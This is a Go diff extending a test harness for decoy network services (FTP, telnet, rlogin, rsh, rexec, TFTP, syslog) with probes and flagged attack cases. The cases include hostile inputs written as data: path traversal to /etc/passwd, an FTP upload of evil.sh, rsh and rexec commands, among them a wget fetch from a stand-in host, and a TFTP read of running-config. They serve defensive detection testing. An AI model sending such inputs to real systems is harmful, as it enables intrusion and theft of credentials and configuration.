@@ -12,6 +12,10 @@ import (
 type protoSpec struct {
 	// ServerFirst: the service speaks before the client (ssh/ftp/smtp/telnet).
 	ServerFirst bool
+	// NoReply marks an accept-only service (e.g. syslog) that records what it
+	// is sent without ever answering. unit/banner + emulate treat an empty
+	// response as healthy for these instead of a missing-banner finding.
+	NoReply bool
 	// Probe is a benign, well-formed request to elicit a response (nil when
 	// ServerFirst and no follow-up is needed).
 	Probe []byte
@@ -89,6 +93,12 @@ var specs = map[string]protoSpec{
 			{"binary-command", append([]byte{0x00, 0x01, 0x02, 0xff}, []byte(" anonymous\r\n")...)},
 			{"traversal-arg", []byte("RETR " + strings.Repeat("../", 2000) + "etc/passwd\r\n")},
 		},
+		// The decoy accepts the second PASS so post-auth intent surfaces; an
+		// upload/download then is a malware-drop / exfil attempt it flags.
+		Misimpl: []misCase{
+			{"upload-attempt", []byte("USER anonymous\r\nPASS x\r\nPASS x\r\nSTOR /tmp/evil.sh\r\nQUIT\r\n"), "ftp-upload-attempt"},
+			{"download-attempt", []byte("USER anonymous\r\nPASS x\r\nPASS x\r\nRETR /etc/passwd\r\nQUIT\r\n"), "ftp-download-attempt"},
+		},
 	},
 	"smtp_recv": {
 		ServerFirst: true, Probe: []byte("EHLO probe\r\n"), Banner: []string{"220"},
@@ -105,6 +115,11 @@ var specs = map[string]protoSpec{
 			{"iac-do-storm", bytes.Repeat([]byte{0xff, 0xfd, 0x01}, 300)},
 			{"overlong-line", []byte(strings.Repeat("A", 4000) + "\r\n")},
 			{"binary-creds", append([]byte("root\r\n"), bytes.Repeat([]byte{0x00, 0x01}, 100)...)},
+		},
+		// username then a password full of control bytes — flagged as a
+		// non-printable credential (a tell of a raw protocol/exploit probe).
+		Misimpl: []misCase{
+			{"binary-credentials", []byte("root\r\n\x00\x01\x02\x03\r\n"), "telnet-credential-non-printable"},
 		},
 	},
 	"redis": {
@@ -128,6 +143,92 @@ var specs = map[string]protoSpec{
 		},
 		Misimpl: []misCase{
 			{"write-single-coil", []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x00, 0xff, 0x00}, "modbus-write-attempt"},
+		},
+	},
+	// BSD rlogin (513/tcp). Client-first: it opens with a NUL-separated record
+	// "\0client-user\0server-user\0term/speed\0"; the decoy answers 0x00 then a
+	// password prompt. Any connection is flagged rlogin-attempt.
+	"rlogin": {
+		Probe:     []byte("\x00rprobe\x00rprobe\x00xterm/38400\x00"),
+		EmulateOK: func(r []byte) bool { return len(r) > 0 && (r[0] == 0x00 || bytes.Contains(r, []byte("Password"))) },
+		Smart: []namedBytes{
+			{"overlong-user", []byte("\x00rprobe\x00" + strings.Repeat("A", 4000) + "\x00xterm\x00")},
+			{"no-nulls", []byte("not-an-rlogin-record\r\n")},
+		},
+		Misimpl: []misCase{
+			{"connect", []byte("\x00probe\x00probe\x00xterm\x00"), "rlogin-attempt"},
+		},
+	},
+	// BSD rsh (514/tcp). Client-first record "stderr_port\0local\0remote\0cmd\0";
+	// the decoy answers 0x01 + "Permission denied." Any connection is
+	// rsh-attempt; a non-empty command is rsh-command.
+	"rsh": {
+		Probe: []byte("0\x00rprobe\x00rprobe\x00\x00"),
+		EmulateOK: func(r []byte) bool {
+			return len(r) > 0 && (r[0] == 0x01 || bytes.Contains(r, []byte("Permission denied")))
+		},
+		Smart: []namedBytes{
+			{"overlong-user", []byte("0\x00" + strings.Repeat("A", 4000) + "\x00root\x00\x00")},
+			{"no-nulls", []byte("not-an-rsh-record\r\n")},
+		},
+		Misimpl: []misCase{
+			{"command", []byte("0\x00root\x00root\x00id;uname -a\x00"), "rsh-command"},
+		},
+	},
+	// BSD rexec (512/tcp). Like rsh but the record carries a cleartext password:
+	// "stderr_port\0user\0pass\0cmd\0". rexec-attempt on any connection,
+	// rexec-command when a command is present.
+	"rexec": {
+		Probe: []byte("0\x00rprobe\x00rprobe\x00\x00"),
+		EmulateOK: func(r []byte) bool {
+			return len(r) > 0 && (r[0] == 0x01 || bytes.Contains(r, []byte("Permission denied")))
+		},
+		Smart: []namedBytes{
+			{"overlong-pass", []byte("0\x00root\x00" + strings.Repeat("A", 4000) + "\x00\x00")},
+			{"no-nulls", []byte("not-an-rexec-record\r\n")},
+		},
+		Misimpl: []misCase{
+			{"command", []byte("0\x00root\x00toor\x00wget http://x/m -O /tmp/m\x00"), "rexec-command"},
+		},
+	},
+	// TFTP (69/udp). Client-first: RRQ/WRQ "opcode(2)|filename\0mode\0". The
+	// decoy answers ERROR(5) access-violation; a WRQ is a tftp-write-attempt and
+	// an RRQ for a device config file is tftp-config-read.
+	"tftp": {
+		Probe:     []byte("\x00\x01probe.txt\x00octet\x00"),
+		Banner:    []string{"Access violation"},
+		EmulateOK: func(r []byte) bool { return len(r) >= 4 && r[0] == 0x00 && r[1] == 0x05 },
+		Smart: []namedBytes{
+			{"bad-opcode", []byte("\x00\x09probe\x00octet\x00")},
+			{"truncated", []byte("\x00\x01ab")},
+			{"overlong-filename", []byte("\x00\x01" + strings.Repeat("A", 5000) + "\x00octet\x00")},
+		},
+		Misimpl: []misCase{
+			{"write-attempt", []byte("\x00\x02upload.bin\x00octet\x00"), "tftp-write-attempt"},
+			{"config-read", []byte("\x00\x01running-config\x00octet\x00"), "tftp-config-read"},
+		},
+	},
+	// Syslog over TCP (RFC 6587). Accept-only: it records messages and never
+	// answers, so NoReply makes unit/emulate treat an empty response as healthy.
+	"syslog_tcp": {
+		Probe:     []byte("<13>probe: tarpit-harness syslog test\n"),
+		NoReply:   true,
+		EmulateOK: func(r []byte) bool { return true },
+		Smart: []namedBytes{
+			{"oversized-msg", []byte("<13>" + strings.Repeat("A", 6000) + "\n")},
+			{"binary-msg", append([]byte("<13>"), bytes.Repeat([]byte{0x00, 0x01, 0x02}, 200)...)},
+			{"octet-count-overflow", []byte("99999999 " + strings.Repeat("B", 64))},
+		},
+	},
+	// Syslog over UDP (RFC 3164/5424), one message per datagram. Accept-only.
+	"syslog_udp": {
+		Probe:     []byte("<13>probe: tarpit-harness syslog test"),
+		NoReply:   true,
+		EmulateOK: func(r []byte) bool { return true },
+		Smart: []namedBytes{
+			{"oversized-msg", []byte("<13>" + strings.Repeat("A", 6000))},
+			{"binary-msg", append([]byte("<13>"), bytes.Repeat([]byte{0x00, 0x01, 0x02}, 200)...)},
+			{"empty-pri", []byte("<>no pri value")},
 		},
 	},
 }
